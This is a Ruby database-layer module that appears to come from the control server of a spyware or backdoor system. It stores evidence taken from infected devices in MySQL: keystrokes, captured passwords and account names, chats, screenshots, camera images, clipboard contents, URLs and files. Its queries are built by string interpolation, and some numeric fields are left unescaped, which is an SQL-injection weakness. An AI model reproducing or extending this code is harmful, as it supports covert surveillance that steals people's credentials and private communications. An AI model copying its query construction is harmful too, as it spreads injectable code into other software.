#
# Mix-in for DB Layer
#

module DBLayer
module Evidence
  
  def evidence_store(evidence)
    trace :debug, "storing evidence #{evidence.info[:type]} for backdoor #{evidence.info[:instance]}"
    
    case evidence.info[:type]
      when :DEVICE, :INFO
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :SNAPSHOT
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 #{evidence.info[:size]},
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :PRINT
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:name])}',
                 #{evidence.info[:size]},
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :KEYLOG
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 '#{@mysql.escape(evidence.info[:keystrokes])}')"
      when :CHAT, :CHATSKYPE
        # override the CHATSKYPE
        evidence.info[:type] = :CHAT
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, varchar3, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:program])}',
                 '#{@mysql.escape(evidence.info[:topic])}',
                 '#{@mysql.escape(evidence.info[:users])}',
                 '#{@mysql.escape(evidence.info[:keystrokes])}')"
      when :CAMERA
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 #{evidence.info[:size]},
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :MOUSE
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `varchar3`, `int1`, `int2`, `int3`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 '#{evidence.info[:width].to_s}x#{evidence.info[:height].to_s}',
                 #{evidence.info[:size]},
                 #{evidence.info[:x]},
                 #{evidence.info[:y]},
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :URLCAPTURE
        # override
        evidence.info[:type] = :URL
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `varchar3`, `varchar4`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:url])}',
                 '#{@mysql.escape(evidence.info[:browser])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 '#{@mysql.escape(evidence.info[:keywords])}',
                 #{evidence.info[:size]},
                 '#{@mysql.escape(evidence.info[:content])}')"
        when :URL
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `varchar3`, `varchar4`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:url])}',
                 '#{@mysql.escape(evidence.info[:browser])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 '#{@mysql.escape(evidence.info[:keywords])}')"
        when :CLIPBOARD
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process])}',
                 '#{@mysql.escape(evidence.info[:window])}',
                 '#{@mysql.escape(evidence.info[:clipboard])}')"
        when :PASSWORD
          # check if the account is already present
          present = mysql_query("SELECT log_id FROM log
                                 WHERE `type` = 'PASSWORD' AND
                                       `backdoor_id` = #{evidence.info[:backdoor_id]} AND
                                       `remotehost` = '#{@mysql.escape(evidence.info[:device_id])}' AND
                                       `remoteuser` = '#{@mysql.escape(evidence.info[:user_id])}' AND
                                       `varchar1` = '#{@mysql.escape(evidence.info[:resource])}' AND
                                       `varchar2` = '#{@mysql.escape(evidence.info[:service])}' AND
                                       `varchar3` = '#{@mysql.escape(evidence.info[:pass])}' AND
                                       `varchar4` = '#{@mysql.escape(evidence.info[:user])}'").to_a
        unless present.empty?
          mysql_query("UPDATE log SET received = UTC_TIMESTAMP() WHERE log_id = #{present.first[:log_id]}")
          return nil
        end
          q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, varchar3, varchar4)
                   VALUES (0,
                   '#{@mysql.escape(evidence.info[:type].to_s)}',
                   1,
                   #{evidence.info[:backdoor_id]},
                   '#{@mysql.escape(evidence.info[:source_id])}',
                   '#{@mysql.escape(evidence.info[:device_id])}',
                   '#{@mysql.escape(evidence.info[:user_id])}',
                   '#{@mysql.escape(evidence.info[:received].to_s)}',
                   '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                   '#{@mysql.escape(evidence.info[:resource])}',
                   '#{@mysql.escape(evidence.info[:service])}',
                   '#{@mysql.escape(evidence.info[:pass])}',
                   '#{@mysql.escape(evidence.info[:user])}')"
        #TODO: unifiy with FILECAP
        when :FILEOPEN
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, `varchar1`, `varchar2`, `int1`, `int2`, `int3`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process])}',
                 '#{@mysql.escape(evidence.info[:file])}',
                 #{evidence.info[:size_hi]},
                 #{evidence.info[:size_lo]},
                 #{evidence.info[:mode]})"
      when :FILECAP
        # check if the file is already present
        present = mysql_query("SELECT log_id FROM log
                                 WHERE `type` = 'FILECAP' AND
                                       `backdoor_id` = #{evidence.info[:backdoor_id]} AND
                                       `varchar1` = '#{@mysql.escape(evidence.info[:filename])}' AND
                                       `varchar2` = '#{@mysql.escape(evidence.info[:md5])}'").to_a
        unless present.empty?
          mysql_query("UPDATE log SET received = UTC_TIMESTAMP() WHERE log_id = #{present.first[:log_id]}")
          return nil
        end

        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, `varchar1`, `varchar2`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 1,
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:filename])}',
                 '#{@mysql.escape(evidence.info[:md5])}',
                 #{evidence.info[:size]},
                 '#{@mysql.escape(evidence.info[:content])}')"
      else
        trace :debug, "Not implemented."
        return nil
    end
    
    ret =  mysql_query(q)
    
    stat = evidence.info[:type].to_s.downcase
    stat_new = stat + '_new'
    mysql_query("UPDATE `stat` SET `#{stat}` = `#{stat}` + 1, `#{stat_new}` = `#{stat_new}` + 1 WHERE `backdoor_id` = '#{evidence.info[:backdoor_id]}'")
    return ret
  end
  
end # ::Evidence
end # ::DBLayer
